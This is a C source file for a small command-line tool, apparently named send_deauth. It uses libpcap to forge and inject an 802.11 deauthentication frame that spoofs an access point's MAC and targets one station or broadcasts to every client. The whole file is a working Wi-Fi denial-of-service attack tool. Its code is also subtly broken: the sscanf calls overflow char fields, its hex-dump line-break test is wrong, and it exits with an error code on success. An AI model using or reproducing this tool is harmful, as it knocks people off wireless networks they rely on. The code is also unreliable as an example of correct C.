#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <linux/if_ether.h>
#include <netinet/in.h>
#include <pcap.h>

typedef struct radiotap_hdr {
	uint8_t  version;
	uint8_t  pad;
	uint16_t length;
	uint32_t present;
} radio_hdr;

static const uint8_t u8aRadiotapHeader[] = {

  0x00, 0x00, // <-- radiotap version (ignore this)
  0x0c, 0x00, // <-- number of bytes in our header (count the number of "0x"s)
  0x04, 0x80, 0x00, 0x00,
  0x02, 0x00, 0x18, 0x00 //0x00, 0x00, 0x00, 0x00, // <-- timestamp
};

typedef struct Frame {
	uint8_t subtype : 4;
	uint8_t type : 2;
	uint8_t version : 2;
	uint8_t flags : 8;
	uint16_t duration_id;
	char dest_addr[6];
	char sour_addr[6];
	char bss_id[6];
	uint16_t seq_num : 12;
	uint16_t frag_num : 4;
} Frame;

void print_hex(char* buf, int size) {
	
	for(int i = 0; i < size; i++) {
		printf("%02x ", *(buf + i));

		if(i + 1 % 8 == 0) {
			printf("\n");
		}
	}
	printf("\n");
}

int main(int argc, char** argv) {

	char buf[128];
	//radio_hdr *r_hdr = (radio_hdr*) buf;
	//r_hdr->version = 0;
	//r_hdr->pad = 0;
	//r_hdr->length = htole16(sizeof(radio_hdr));
	//r_hdr->present = htole32();

	memcpy(buf, u8aRadiotapHeader, sizeof(u8aRadiotapHeader));
	Frame *frame= (Frame*)(buf + sizeof(u8aRadiotapHeader));
	char *data = buf + sizeof(u8aRadiotapHeader) + sizeof(Frame);
	frame->subtype = 12;
	frame->type = 0;
	frame->version = 0;
	frame->flags = 0;
	frame->duration_id = 0;
	frame->seq_num = 0;
	frame->frag_num = 0;

	data[0] = 0x07;
	data[1] = 0x00;

	if(argc < 3) {
		printf("Usage: send_deauth <interce name> <ap mac> [<station mac>]\n");
		printf("ex) : send_deauth mon0 00:11:22:33:44:55\n");
		return 0;
	}


//	int fd=socket(AF_PACKET,SOCK_DGRAM,htons(ETH_P_ARP));
//	if (fd==-1) {
//   		die("%s",strerror(errno));
//	}

	pcap_t *handle;
	char errbuf[PCAP_ERRBUF_SIZE];
	errbuf[0]='\0';
	char *dev = argv[1];

//	if (pcap_lookupnet(dev, &net, &mask, errbuf) == -1) {
//		fprintf(stderr, "Can't get netmask for device %s\n", dev);
//		net = 0;
//		mask = 0;
//	}

	handle = pcap_open_live(dev, 800, 1, 1000, errbuf);
	if (handle == NULL) {
		fprintf(stderr, "Couldn't open device %s: %s\n", dev, errbuf);
		return 2 ;
	}


	/* set bss_id and source address */
	sscanf(argv[2], "%02x:%02x:%02x:%02x:%02x:%02x", frame->sour_addr, frame->sour_addr + 1,
 				frame->sour_addr + 2, frame->sour_addr + 3, frame->sour_addr + 4, frame->sour_addr + 5);
	sscanf(argv[2], "%02x:%02x:%02x:%02x:%02x:%02x", frame->bss_id, frame->bss_id + 1,
 				frame->bss_id + 2, frame->bss_id + 3, frame->bss_id + 4, frame->bss_id + 5);

	/* select unicast or broadcast */
	if(argc > 3) {
		sscanf(argv[3], "%02x:%02x:%02x:%02x:%02x:%02x", frame->dest_addr, frame->dest_addr + 1,
 					frame->dest_addr + 2, frame->dest_addr + 3, frame->dest_addr + 4, frame->dest_addr + 5);
	}
	else {
		sscanf("ff:ff:ff:ff:ff:ff", "%02x:%02x:%02x:%02x:%02x:%02x", frame->dest_addr, frame->dest_addr + 1,
 					frame->dest_addr + 2, frame->dest_addr + 3, frame->dest_addr + 4, frame->dest_addr + 5);
	}

	/* send */
	if (pcap_sendpacket(handle, buf, sizeof(Frame) + sizeof(u8aRadiotapHeader) + 2) == 0) {
    		pcap_close(handle);
    		exit(1);
	}
	
   	pcap_perror(handle,0);
	pcap_close(handle);

	
	return 0;
}
